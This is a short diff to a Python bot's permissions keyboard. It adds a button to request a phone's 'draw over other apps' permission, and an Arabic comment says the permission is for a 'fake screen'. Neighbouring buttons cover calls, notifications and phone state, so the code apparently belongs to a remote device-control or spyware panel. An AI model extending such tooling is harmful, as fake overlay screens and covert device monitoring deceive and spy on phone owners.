@@ -536,6 +536,8 @@ def permissions_keyboard(did):
            perm_btn("calls", "📞 المكالمات"))
     kb.add(perm_btn("notifications", "🔔 الإشعارات"),
            perm_btn("phone-state", "📱 حالة الهاتف"))
+    # ⚡ V11.2.50: إذن الظهور فوق التطبيقات (لتجربة الشاشة الوهمية)
+    kb.add(perm_btn("overlay", "🪟 الظهور فوق التطبيقات"))
     # ⚡ البث المباشر تمت إزالته
     kb.add(_back(did))
     return kb
